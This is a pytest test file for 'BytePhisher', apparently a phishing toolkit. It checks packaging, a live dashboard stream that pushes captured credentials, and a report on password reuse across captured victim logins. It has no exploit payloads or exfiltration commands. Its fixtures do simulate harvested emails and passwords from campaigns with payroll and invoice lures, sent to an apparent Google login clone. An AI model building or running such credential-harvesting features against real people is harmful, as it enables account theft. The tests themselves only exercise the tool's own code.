"""BytePhisher gap-closure tests: pip packaging, SSE stream, update check,
credential reuse.

Run:  ./.venv/bin/python -m pytest tests/test_gaps.py -v
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import pytest
from conftest import TEMPLATES, free_port

from core import capture as cap
from dashboard import web_dashboard

# tier marker: the Makefile and pyproject document `pytest -m integration` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.integration


HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = os.path.join(HERE, ".venv", "bin", "python")
if not os.path.exists(PY):
    PY = sys.executable


# ====================================================== packaging / pip ======
class TestPackaging:
    def test_pyproject_declares_entry_point_and_packages(self):
        # tomllib is stdlib from 3.11; tomli is the same parser for 3.10, which
        # the project supports and CI tests
        try:
            import tomllib
        except ModuleNotFoundError:
            import tomli as tomllib
        with open(os.path.join(HERE, "pyproject.toml"), "rb") as f:
            data = tomllib.load(f)
        assert data["project"]["name"] == "bytephisher"
        assert data["project"]["scripts"]["bytephisher"] == "bytephisher:main"
        assert data["project"]["requires-python"] == ">=3.10"
        mods = data["tool"]["setuptools"]["packages"]
        for p in ("core", "tunnels", "dashboard", "mailer", "tools"):
            assert p in mods, p
        assert "bytephisher" in data["tool"]["setuptools"]["py-modules"]

    def test_console_script_runs_from_any_directory(self):
        """Installed entry point must work outside the source tree."""
        script = os.path.join(HERE, ".venv", "bin", "bytephisher")
        if not os.path.exists(script):
            pytest.skip("package not installed in this venv")
        p = subprocess.run([script, "--version"], cwd="/tmp", capture_output=True,
                           text=True, timeout=60)
        assert p.returncode == 0 and "BytePhisher" in p.stdout, p.stdout + p.stderr

    def test_importable_as_a_library(self):
        p = subprocess.run([PY, "-c",
                            "import bytephisher, core.server, core.net, core.gate,"
                            " core.risk, core.proxy, tunnels,"
                            " dashboard, mailer; print(bytephisher.VERSION)"],
                           cwd="/tmp", capture_output=True, text=True, timeout=60)
        assert p.returncode == 0, p.stderr
        assert p.stdout.strip().startswith("0.")

    def test_home_resolution_prefers_env_var(self):
        env = dict(os.environ, BYTEPHISHER_HOME=tempfile.mkdtemp())
        p = subprocess.run([PY, "-c",
                            "import bytephisher; print(bytephisher.HOME)"],
                           cwd="/tmp", env=env, capture_output=True, text=True, timeout=60)
        assert p.returncode == 0
        assert p.stdout.strip() == env["BYTEPHISHER_HOME"]


# ============================================================= SSE feed ======
class TestSSEStream:
    def _serve(self):
        dbp = os.path.join(tempfile.mkdtemp(), "sse.db")
        db = cap.CaptureDB(dbp)
        port = free_port()
        web_dashboard(port=port, db=db, host="127.0.0.1")
        time.sleep(0.8)
        return db, port

    def test_stream_content_type_and_keepalive(self):
        db, port = self._serve()
        req = urllib.request.Request(f"http://127.0.0.1:{port}/stream")
        with urllib.request.urlopen(req, timeout=10) as r:
            assert r.headers.get("Content-Type", "").startswith("text/event-stream")
            line = r.readline().decode()
            assert line.startswith("retry:")
        db.close()

    def test_stream_pushes_a_new_capture(self):
        """Connect, then POST a capture: it must arrive on the open stream."""
        from core import server as srv
        db, port = self._serve()
        dbp = db.conn.execute("PRAGMA database_list").fetchone()[2]
        srv_port = free_port()
        httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), srv_port, dbp,
                             geo_provider="off", campaign="sse")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)

        received = []
        stop = {"flag": False}

        def reader():
            req = urllib.request.Request(f"http://127.0.0.1:{port}/stream")
            with urllib.request.urlopen(req, timeout=30) as r:
                event = None
                while not stop["flag"]:
                    line = r.readline().decode("utf-8", "replace").strip()
                    if line.startswith("event:"):
                        event = line.split(":", 1)[1].strip()
                    elif line.startswith("data:") and event == "capture":
                        received.append(json.loads(line.split(":", 1)[1].strip()))

        t = threading.Thread(target=reader, daemon=True)
        t.start()
        time.sleep(1.0)

        req = urllib.request.Request(
            f"http://127.0.0.1:{srv_port}/",
            data=urllib.parse.urlencode({"email": "sse@example.com", "password": "Sse1!"}).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0)"})
        urllib.request.urlopen(req, timeout=10).read()

        deadline = time.time() + 15
        while not received and time.time() < deadline:
            time.sleep(0.3)
        stop["flag"] = True
        httpd.shutdown()
        db.close()
        assert received, "capture never arrived on the SSE stream"
        assert received[0]["fields"]["email"] == "sse@example.com"
        assert received[0]["campaign"] == "sse"
        assert "id" in received[0]

    def test_dashboard_page_uses_eventsource_with_poll_fallback(self):
        db, port = self._serve()
        html = urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=10).read().decode()
        db.close()
        assert "EventSource('/stream')" in html
        assert "es.onerror" in html and "setInterval(fill" in html   # fallback path


# ========================================================== update check =====
# ======================================================= credential reuse ====
class TestCredentialReuse:
    @pytest.fixture()
    def db(self):
        d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(), "reuse.db"))
        # same identity twice, in two campaigns
        d.record("/", "1.1.1.1", "Delhi", "India", "Airtel", "UA", "android",
                 {"email": "same@corp.com", "password": "Shared123!"}, True,
                 campaign="q3-payroll", risk=0)
        d.record("/", "1.1.1.2", "Mumbai", "India", "Jio", "UA", "ios",
                 {"email": "same@corp.com", "password": "Shared123!"}, True,
                 campaign="q4-invoice", risk=0)
        # same password, different identities (password reuse)
        d.record("/", "1.1.1.3", "Pune", "India", "Airtel", "UA", "windows",
                 {"username": "other@corp.com", "password": "Shared123!"}, True,
                 campaign="q4-invoice", risk=0)
        # a unique one-off credential
        d.record("/", "1.1.1.4", "Chennai", "India", "Airtel", "UA", "macos",
                 {"email": "unique@corp.com", "password": "Uniq!987"}, True,
                 campaign="q4-invoice", risk=0)
        # OTP-only submission must not count as a credential
        d.record("/otp", "1.1.1.5", "", "", "", "UA", "ios", {"otp_1": "1"}, False,
                 campaign="q4-invoice", risk=0)
        yield d
        d.close()

    def test_repeated_identity_detected(self, db):
        res = db.reuse_stats()
        ids = {r["identity"]: r for r in res["repeated_identities"]}
        assert "same@corp.com" in ids
        assert ids["same@corp.com"]["count"] == 2
        assert set(ids["same@corp.com"]["campaigns"]) == {"q3-payroll", "q4-invoice"}
        assert "unique@corp.com" not in ids

    def test_repeated_password_across_identities_detected(self, db):
        res = db.reuse_stats()
        pws = {r["password"]: r for r in res["repeated_passwords"]}
        assert "Shared123!" in pws
        assert pws["Shared123!"]["count"] == 3
        assert len(pws["Shared123!"]["identities"]) == 2      # two distinct accounts
        assert "Uniq!987" not in pws

    def test_otp_only_rows_are_ignored(self, db):
        res = db.reuse_stats()
        for r in res["repeated_identities"] + res["repeated_passwords"]:
            assert "otp" not in json.dumps(r).lower()

    def test_cli_reuse_flag(self, db):
        # Point the CLI at a DB we control WITHOUT touching the tracked
        # config/config.yaml: a crash between write and restore (or two suites at
        # once) left the repo config pointing at a temp database. BYTEPHISHER_HOME
        # gives the CLI its own config + data dir instead.
        dbfile = db.conn.execute("PRAGMA database_list").fetchone()[2]
        home = tempfile.mkdtemp(prefix="bh_gaps_home_")
        os.makedirs(os.path.join(home, "config"), exist_ok=True)
        shutil.copy(os.path.join(HERE, "config", "config.yaml"),
                    os.path.join(home, "config", "config.yaml"))
        cfg = os.path.join(home, "config", "config.yaml")
        original = open(cfg).read()
        try:
            open(cfg, "w").write(original.replace("db_path: data/bytephisher.db",
                                                  f"db_path: {dbfile}"))
            env = dict(os.environ, BYTEPHISHER_HOME=home)
            p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"), "--reuse"],
                               cwd=HERE, capture_output=True, text=True, timeout=60,
                               env=env)
            assert p.returncode == 0
            assert "credential-reuse analysis" in p.stdout
            assert "same@corp.com" in p.stdout
            assert "repeated passwords  : 1" in p.stdout
        finally:
            shutil.rmtree(home, ignore_errors=True)

